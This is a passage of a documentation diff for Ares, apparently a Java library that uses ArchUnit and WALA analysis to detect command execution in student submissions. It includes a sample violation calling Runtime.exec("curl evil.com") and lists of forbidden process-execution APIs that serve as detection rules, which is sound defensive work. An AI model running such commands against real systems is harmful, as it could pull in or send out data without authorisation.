   ↓
-ClassLoader.loadLibrary()  (JDK helper)
+java.io.BufferedReader.readLine()  (infrastructure frame)
   ↓
-Runtime.loadLibrary()  (allowed helper API)
+<forbidden JDK-internal method>
 
-Result: IGNORED (legitimate JDK library loading)
+Result: IGNORED (student called a permitted JDK API; the forbidden call is a JDK-internal side-effect)
 ```
 
 **Path 2 (Detected):**
 ```
 StudentCode.exploit()
   ↓
-Runtime.exec("curl evil.com")  (forbidden, no helpers in path)
+Runtime.exec("curl evil.com")  (student frame directly adjacent to the sink)
 
-Result: VIOLATION (direct command execution by student)
+Result: VIOLATION (direct command execution by student, never suppressed)
 ```
 
-**Special WALA Features:**
+**Note on `Runtime.loadLibrary`:** `Runtime.load` and `Runtime.loadLibrary` are themselves on the forbidden command-execution lists (see [2.1](#21-command-system---execute-operations)). A student calling them directly is a violation; there is no "allowed helper API" list.
 
-**JDK Helper Filtering:**
-WALA mode includes intelligent filtering of JDK-internal helper classes that may legitimately invoke process-related operations:
+---
+
+## 5.6 Legacy Utilities: ReachabilityChecker and CustomDFSPathFinder
+
+The DFS-based path finding in the `wala` package is **legacy and no longer on the production validation path**; validation now runs through `WalaRule.check` as described above. `ReachabilityChecker.findReachableMethods(...)` (which delegates to `CustomDFSPathFinder`) is not called during validation anymore. Note that `ReachabilityChecker.getEntryPointsFromStudentSubmission(...)` is still used in production, but only by `CustomCallgraphBuilder` to collect the call-graph entry points.
+
+For historical context, `CustomDFSPathFinder` implements an **iterative** depth-first search (not a recursive one): it keeps the current path on a `Deque` stack, tracks per-node `pendingChildren` iterators, orders successors deterministically via `sortedSuccessors` (sorted by method signature, since WALA's `HashSet`-backed successor order differs between JVM runs), and skips methods listed in the false-positives file `templates/architecture/java/wala/false-positives/false-positives-file.txt`:
+
 ```java
-private static final List<String> JDK_HELPERS = List.of(
-    "java/lang/ClassLoader",
-    "sun/launcher/LauncherHelper"
-);
-
-// Ignores paths like: StudentCode → ClassLoader.loadLibrary (legitimate JDK operation)
-// Detects real violations: StudentCode → Runtime.exec (direct command execution)
+public @Nullable List<CGNode> find() {
+    if (!initialized) {
+        init();  // push first root, record its sorted successors
+    }
+    while (!stack.isEmpty()) {
+        if (P.test(stack.peek())) {           // target filter matched
+            List<CGNode> path = new ArrayList<>(stack);
+            Collections.reverse(path);
+            advance();                         // move forward for next call
+            return path;
+        }
+        advance();                             // push next unvisited child or backtrack
+    }
+    return null;
+}
 ```
 
-## 6.1 Writing Architecture Test Cases
+Its global visited-marking (one reported path per sink) is exactly the masking weakness that motivated the per-sink reverse-reachability approach in `WalaRule` (see [5.4](#54-sink-evaluation-and-reverse-reachability-wala)).
+
+---
+
+# 6. Writing Architecture Test Cases
 
 Architecture test cases can be **generated as Java code** for integration into test suites.
 
@@ -745,24 +703,18 @@ JavaArchunitTestCase testCase = JavaArchunitTestCase.archunitBuilder()
 String testCode = testCase.writeArchitectureTestCase("ARCHUNIT", "");
 ```
 
-**Generated Code Example:**
+**Generated Code** (from the template `archunit/rules/COMMAND_EXECUTION.txt`; `${javaClasses}` is replaced by the `ClassFileImporter` expression shown in [4.1](#41-loading-java-classes-archunit)):
 ```java
 @Test
-void testNoCommandExecution() {
-    JavaClasses javaClasses = new ClassFileImporter()
+public void commandSystemShouldNotBeAccessed() {
+    javaClasses = new ClassFileImporter()
         .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
         .withImportOption(location -> {
             String path = location.toString().replace("\\", "/");
-            return !path.contains("/ares/api/");
+            return !path.contains("/de/tum/cit/ase/ares/api/");
         })
         .importPackages("de.student");
-    
-    Set<PackagePermission> allowedPackages = Set.of(
-        new PackagePermission("java.lang")
-    );
-    
-    JavaArchunitTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS
-        .check(javaClasses);
+    JavaArchunitTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(javaClasses);
 }
 ```
 
@@ -779,26 +731,18 @@ JavaWalaTestCase testCase = JavaWalaTestCase.walaBuilder()
 String testCode = testCase.writeArchitectureTestCase("WALA", "");
 ```
 
-**Generated Code Example:**
+**Generated Code** (from the template `wala/rules/COMMAND_EXECUTION.txt`; `${callGraph}` is replaced by the call-graph construction expression):
 ```java
 @Test
-void testNoCommandExecution() {
-    String classPath = System.getProperty("java.class.path");
-    CallGraph callGraph = new CustomCallgraphBuilder(classPath)
-        .buildCallGraph(classPath);
-    
-    Set<PackagePermission> allowedPackages = Set.of(
-        new PackagePermission("java.lang")
-    );
-    
-    JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS
-        .check(callGraph);
+public void commandSystemShouldNotBeAccessed() {
+    callGraph = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);
+    JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(callGraph);
 }
 ```
 
 ---
 
-# 6. Conclusion
+# 7. Conclusion
 
 ## Summary for Programming Instructors (TL;DR)
 
@@ -833,7 +777,7 @@ void testNoCommandExecution() {
 | **Performance Impact** | Analysis overhead only | Runtime overhead on every call |
 | **False Positives** | Possible (unreachable code) | None (only executed code checked) |
 | **Coverage** | All code paths | Only executed paths |
-| **Configuration** | Package-level permissions | Command-level permissions |
+| **Configuration** | Class-level exemptions | Command-level permissions |
 | **Use Case** | Pre-submission validation | Runtime security enforcement |
 | **Error Timing** | Test phase | Production execution |
 
@@ -850,8 +794,8 @@ void testNoCommandExecution() {
 
 **Violation Example:**
 ```
-Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
-Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
+Architecture Violation [Priority: MEDIUM] - Rule 'Executes commands' was violated (1 times):
+Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(java.lang.String)> by
   [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
 ```
 
@@ -866,14 +810,13 @@ Method <de.student.StudentCode.exploit()> transitively accesses method <java.lan
 
 **Implementation:**
 - Builds complete call graph using IBM WALA framework
-- Performs reachability analysis from entry points to forbidden methods
-- Includes false positive filtering for JDK internals
+- Collects forbidden sinks, checks entry-point reachability (forward BFS), and reverse-walks per sink to attribute violations to the nearest student frame
+- Includes per-path false positive classification for transitive JDK internals
 
-**Violation Example:**
+**Violation Example** (format of `security.architecture.method.call.message`):
 ```
-Forbidden method 'java.lang.ProcessBuilder.start()Ljava/lang/Process;' is reachable from 'de.student.StudentCode.exploit()V' 
-in class 'de.student.StudentCode' at line 23
-Called by test method: 'org.example.TestClass.testExploit()V'
+'Executes commands'
+ Method <de.student.StudentCode.exploit()> calls method <java.lang.ProcessBuilder.start()> in (ProcessBuilder.java:1170) accesses <de.student.StudentCode.exploit()>
 ```
 
 **Best For:**
@@ -886,22 +829,38 @@ Called by test method: 'org.example.TestClass.testExploit()V'
 
 ### **Forbidden Method Templates**
 
-Both modes load forbidden methods from text files:
+Both modes load forbidden methods from text files. The files contain one method per line without return types; blank lines and `#` comment lines are ignored.
 
-**File Format:**
+**ArchUnit File Format (source form):**
 ```
-# Runtime.exec variants
-java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;
-java.lang.Runtime.exec([Ljava/lang/String;)Ljava/lang/Process;
-java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/Process;
-java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;
-java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/Process;
-java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;
+java.lang.Runtime.exec(java.lang.String)
+java.lang.Runtime.exec(java.lang.String[])
+java.lang.Runtime.exec(java.lang.String, java.lang.String[])
+java.lang.Runtime.exec(java.lang.String[], java.lang.String[])
+java.lang.Runtime.exec(java.lang.String, java.lang.String[], java.io.File)
+java.lang.Runtime.exec(java.lang.String[], java.lang.String[], java.io.File)
+java.lang.Runtime.load(java.lang.String)
+java.lang.Runtime.loadLibrary(java.lang.String)
+java.lang.ProcessBuilder.start()
+java.lang.ProcessBuilder.<init>(java.util.List)
+java.lang.ProcessBuilder.<init>(java.lang.String[])
+java.lang.ProcessBuilder.startPipeline
+```
 
-# ProcessBuilder
-java.lang.ProcessBuilder.<init>([Ljava/lang/String;)V
-java.lang.ProcessBuilder.<init>(Ljava/util/List;)V
-java.lang.ProcessBuilder.start()Ljava/lang/Process;
+**WALA File Format (JVM descriptor parameters, no return type):**
+```
+java.lang.Runtime.exec(Ljava/lang/String;)
+java.lang.Runtime.exec([Ljava/lang/String;)
+java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;)
+java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;)
+java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)
+java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)
+java.lang.Runtime.load(Ljava/lang/String;)
+java.lang.Runtime.loadLibrary(Ljava/lang/String;)
+java.lang.ProcessBuilder.start()
+java.lang.ProcessBuilder.<init>(Ljava/util/List;)
+java.lang.ProcessBuilder.<init>([Ljava/lang/String;)
+java.lang.ProcessBuilder.startPipeline
 ```
 
 **Template Locations:**
@@ -918,7 +877,7 @@ java.lang.ProcessBuilder.start()Ljava/lang/Process;
     <dependency>
         <groupId>de.tum.cit.ase</groupId>
         <artifactId>ares</artifactId>
-        <version>2.0.1-Beta6</version>
+        <version>2.0.1-Beta8</version>
     </dependency>
 </dependencies>
 ```
@@ -932,11 +891,10 @@ void testNoCommandExecution() {
         .importPackages("de.student");
     
     // Create test case
-    JavaArchitectureTestCase testCase = JavaArchitectureTestCase.builder()
+    JavaArchunitTestCase testCase = JavaArchunitTestCase.archunitBuilder()
         .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
         .allowedPackages(Set.of())
         .javaClasses(javaClasses)
-        .callGraph(null)  // null for ArchUnit mode
         .build();
     
     // Execute
